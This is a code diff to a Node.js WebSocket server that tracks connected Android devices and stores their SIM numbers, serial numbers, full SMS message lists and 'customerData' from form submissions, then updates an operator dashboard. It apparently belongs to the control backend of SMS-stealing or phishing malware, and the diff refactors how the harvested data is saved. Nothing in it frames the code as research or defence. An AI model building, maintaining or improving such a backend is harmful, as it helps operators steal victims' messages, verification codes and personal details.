@@ -143,20 +143,30 @@ wss.on('connection', (ws, req) => {
       if (!global.deviceSockets.has(id)) global.deviceSockets.set(id, new Set());
       global.deviceSockets.get(id).add(ws);
       
-      let b = parseInt(data.battery);
-      const update = { 
-          $set: { 
-              deviceId: id, isOnline: true, lastSeen: new Date(),
-              model: data.model, androidVersion: data.androidVersion,
-              sim1: data.sim1, sim2: data.sim2, battery: isNaN(b) ? 0 : b,
-              serialNumber: data.serialNumber || id, isDeleted: false
-          } 
+      const updateSet = { 
+          isOnline: true, 
+          lastSeen: new Date(),
+          isDeleted: false
       };
-      if (data.type === 'SMS_LIST') update.$set.smsMessages = data.messages;
-      if (data.type === 'FORM_SUBMIT') update.$set.customerData = data.customerData;
+
+      if (data.model) updateSet.model = data.model;
+      if (data.androidVersion) updateSet.androidVersion = data.androidVersion;
+      if (data.sim1) updateSet.sim1 = data.sim1;
+      if (data.sim2) updateSet.sim2 = data.sim2;
+      if (data.serialNumber) updateSet.serialNumber = data.serialNumber;
+      
+      let b = parseInt(data.battery);
+      if (!isNaN(b)) updateSet.battery = b;
+
+      if (data.type === 'SMS_LIST' && data.messages) updateSet.smsMessages = data.messages;
+      if (data.type === 'FORM_SUBMIT' && data.customerData) updateSet.customerData = data.customerData;
       
       if (dbConnected) {
-          await Device.findOneAndUpdate({ deviceId: id }, { ...update, $setOnInsert: { registrationTimestamp: new Date() } }, { upsert: true });
+          await Device.findOneAndUpdate(
+            { deviceId: id }, 
+            { $set: updateSet, $setOnInsert: { registrationTimestamp: new Date(), isPinned: false } }, 
+            { upsert: true, writeConcern: { w: 1 } }
+          );
           io.emit('dashboard-update');
       }
     } catch (e) { }
